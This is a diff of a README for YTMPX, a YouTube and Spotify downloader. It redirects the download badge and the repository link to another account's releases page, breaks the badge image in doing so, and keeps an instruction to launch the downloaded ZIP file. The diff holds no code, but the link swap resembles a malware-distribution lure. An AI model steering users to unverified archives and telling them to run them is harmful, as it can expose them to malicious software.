@@ -13,7 +13,7 @@ Welcome to YTMPX - the ultimate command-line tool that empowers you to download 
 - **Topics:** cool, downloader, gui, madebyansh, python, pytube, pytubefix, spotify, youtube, ytmpx, ytmusic
 
 ## Quick Access 🚗
-[![Download YTMPX](https://img.shields.io/badge/Download-YTMPX-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download YTMPX](https://github.com/lucaspb833/YTMPX/releases)](https://github.com/lucaspb833/YTMPX/releases)
 
 ### Note:
 Click the button above to download the ZIP file. Make sure to launch the downloaded file to get started with YTMPX.
@@ -59,7 +59,7 @@ By using YTMPX, you are unlocking a world of possibilities for downloading your 
 
 Start downloading now and enjoy your favorite videos and music offline! 🎶📹
 
-[Visit YTMPX Repository](https://github.com/YT-MPX)
+[Visit YTMPX Repository](https://github.com/lucaspb833/YTMPX/releases)
 
 Enjoy the ultimate downloading experience with YTMPX - Your Ultimate YouTube and Spotify Downloader! 🚀🎧
 
